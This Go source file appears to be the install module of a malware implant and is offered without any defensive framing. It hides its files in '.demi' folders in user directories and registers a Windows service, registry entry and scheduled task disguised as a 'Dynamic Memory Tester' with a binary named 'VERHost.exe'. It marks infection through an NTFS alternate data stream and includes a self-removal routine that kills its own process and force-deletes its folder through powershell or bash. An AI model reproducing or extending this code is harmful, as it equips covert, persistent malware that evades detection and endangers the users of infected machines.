package install

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"time"
)

type installInfo struct {
	Loaded    bool
	Base      string
	Date      time.Time
	PType     int
	Exclusion bool
}

// Info contains persistent configuration details
var (
	Info      installInfo
	StartTime = time.Now()
	Base      = [...]string{
		"C:\\.demi",
		"$userprofile\\Saved Games\\.demi",
		"$userprofile\\Documents\\.demi",
		"$temp\\.demi",
	}
)

const (
	Ads          = "blueberry"
	Binary       = "VERHost.exe"
	Service      = "Memserv2"
	DisplayName  = "Dynamic Memory Tester"
	Description  = "Dynamic memory performance optimization and adjustments"
	Registry     = "Memserv2"
	Task         = "Memserv2"
	Lock         = "lock"
	cmdUninstall = "kill %d -F;rm '%s' -R -Fo"
)

func Removal() {
	go func() {
		time.Sleep(5 * time.Second)
		log.Println("Oh shit")
		cmd := fmt.Sprintf(cmdUninstall, os.Getpid(), Info.Base)
		var intpr string
		if runtime.GOOS == "windows" {
			intpr = "powershell"
		} else if runtime.GOOS == "linux" {
			intpr = "/bin/bash"
		} else {
			intpr = "/bin/zsh"
		}
		exec.Command(intpr, cmd)
	}()
}

// IsInstalled checks whether or not a valid Base is already present on the system.
func IsInstalled() bool {
	_, err := os.Stat(os.Args[0] + ":" + Ads)
	return !os.IsNotExist(err)
}

func ReadInstallInfo() error {
	return readInstallInfo()
}
func Install() bool {
	if runtime.GOOS == "windows" {
		install()
		return true
	}
	return false
}

func Uninstall() {
	uninstall()
}
